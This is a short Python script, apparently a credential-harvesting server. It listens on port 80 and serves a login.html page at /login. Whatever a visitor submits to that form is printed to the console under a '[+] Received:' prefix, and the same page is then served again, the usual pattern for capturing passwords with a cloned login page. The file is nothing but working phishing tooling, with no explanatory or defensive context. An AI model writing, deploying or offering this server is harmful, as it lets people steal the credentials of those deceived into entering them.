from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/login":
            with open("login.html", "rb") as file:
                content = file.read()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.send_header("Content-length", str(len(content)))
                self.end_headers()
                self.wfile.write(content)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/login":
            content_length = int(self.headers.get("Content-Length", 0))
            post_data = self.rfile.read(content_length).decode("utf-8")
            print(f"[+] Received: {post_data}")
            with open("login.html", "rb") as file:
                content = file.read()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.send_header("Content-length", str(len(content)))
                self.end_headers()
                self.wfile.write(content)
        else:
            self.send_response(404)
            self.end_headers()

server = HTTPServer(("0.0.0.0", 80), Handler)
print("[+] Listening on port 80...")
server.serve_forever()
